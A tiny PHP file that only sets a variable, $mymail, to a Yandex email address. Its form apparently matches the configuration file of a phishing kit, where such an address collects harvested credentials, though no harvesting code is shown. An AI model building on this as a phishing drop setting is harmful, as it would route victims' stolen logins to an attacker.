<?php
$mymail = 'officeresult69@yandex.com';
?>